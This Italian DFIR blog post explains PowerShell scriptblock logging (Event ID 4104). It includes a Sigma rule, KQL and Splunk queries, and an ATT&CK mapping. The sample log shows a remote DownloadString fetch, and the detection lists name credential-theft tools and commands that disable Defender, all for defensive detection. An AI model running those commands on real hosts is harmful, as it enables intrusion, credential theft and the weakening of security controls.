---
title: "PowerShell Event ID 4104 spiegato: scriptblock logging per DFIR"
description: "Lo scriptblock logging è il controllo difensivo gratuito più utile di Windows. Registra il corpo completo di ogni script — inclusi quelli offuscati o in-memory — sotto l'evento 4104."
date: "2026-05-17"
---

Quando lo scriptblock logging di PowerShell è abilitato, l'engine registra il corpo di ogni script che esegue — comandi interattivi, script caricati da disco e qualsiasi cosa riflessa in memoria da `Invoke-Expression` o `IEX`. Il record atterra sul [canale](/it/blog/what-is-an-evtx-file) `Microsoft-Windows-PowerShell/Operational` come Event ID **4104**, «Creating Scriptblock text».

## Cosa ottieni

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Per uno script lungo PowerShell lo splitta su più record 4104 (uno per message number). Riassemblarli è essenziale — i frammenti sono facili da fraintendere.

## Come attivarlo

L'impostazione è `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`, equivalente alla Group Policy in *Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging*. Non c'è alcun costo lato PowerShell degno di essere misurato — accendilo ovunque.

## Cosa cattura che nient'altro coglie

L'engine PowerShell logga lo script **dopo** qualsiasi encoding, compressione o riflessione in memoria. Significa che:

- Un'invocazione `-EncodedCommand` logga sia il launcher encoded (nel corrispondente ProcessCreate / 4688) sia il corpo decodificato (nel 4104).
- Uno script che scarica e fa `Invoke-Expression` di un payload remoto logga il corpo *eseguito*, non il wrapper.
- Un attaccante che usa bypass AMSI lascia comunque il record 4104 — il bypass colpisce lo scanning, non il logging.

Questo è il singolo controllo difensivo gratuito più utile della piattaforma. I difensori che non hanno EDR di solito hanno questo.

## Triage del 4104 su larga scala

I pattern ad alto segnale in un corpus di record 4104:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient` — fetch di contenuto remoto.
- `IEX`, `Invoke-Expression` — esecuzione dinamica.
- `FromBase64String`, `[System.Convert]::FromBase64String` — payload encoded.
- `Add-MpPreference -ExclusionPath` — tampering Defender.
- `Set-MpPreference -DisableRealtimeMonitoring` — tampering Defender.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]` — caricamento di assembly in memoria.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound` — tooling offensivo noto.

Un singolo match da solo non è sempre malizioso (gli admin usano `DownloadString` anche loro), ma le combinazioni lo sono. Pivota dal 4104 al [Sysmon evento 1](/it/blog/sysmon-event-id-1-process-create) / 4688 corrispondente per timestamp + processo per recuperare il contesto completo di invocazione.

## Esempio di regola Sigma — tooling offensivo PowerShell in scriptblock

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## Esempio KQL — PowerShell encoded da utente low-priv

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Esempio Splunk — tamper Defender da PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## Mappatura ATT&CK

- **T1059.001 — Command and Scripting Interpreter: PowerShell**: ogni 4104 offensivo mappa qui. PowerShell è una delle tecniche di esecuzione più citate nelle intrusioni moderne.
- **T1027 — Obfuscated Files or Information**: pattern encoded / Base64 / `FromBase64String`.
- **T1059.001 + T1140 — Deobfuscate/Decode Files or Information**: l'engine logga la forma *decodificata*, che è il valore che il 4104 dà sopra il [4688](/it/blog/event-id-4688-process-creation).
- **T1562.001 — Impair Defenses: Disable or Modify Tools**: `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- **T1003.001 — OS Credential Dumping: LSASS Memory**: pattern `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll` nei corpi degli script.
- **T1558.003 — Kerberoasting**: pattern `Invoke-Kerberoast`, `Rubeus kerberoast`.

## Falsi positivi che sembrano esattamente attacchi

- **Runbook admin** a volte usano `Invoke-Expression` legittimamente per configurazione templated. La combinazione è di solito breve, ripetibile e da sessioni admin note.
- **Script di management Defender** (IT aziendale) chiamano `Set-MpPreference` legittimamente per spingere liste di esclusione. Whitelist per certificato di signing dello script o SID dell'host.
- **Installer Chocolatey / WinGet / package** usano PowerShell Base64-encoded legittimamente. Pattern: breve, diurno, da host build/admin.
- **Attività red-team / pentest** sembrerà identica ad attacchi reali. Coordina le finestre di engagement e tagga gli IP sorgente dell'operatore.

## Il punto cieco

Il 4104 logga il *corpo* dello script. Non logga esecuzione per-statement, return di funzioni o valori di variabili. Per quello serve la transcription (evento 4103, «Module logging») o un EDR vero. Il 4104 ti dice cosa è girato; il resto ti dice cosa ha fatto.
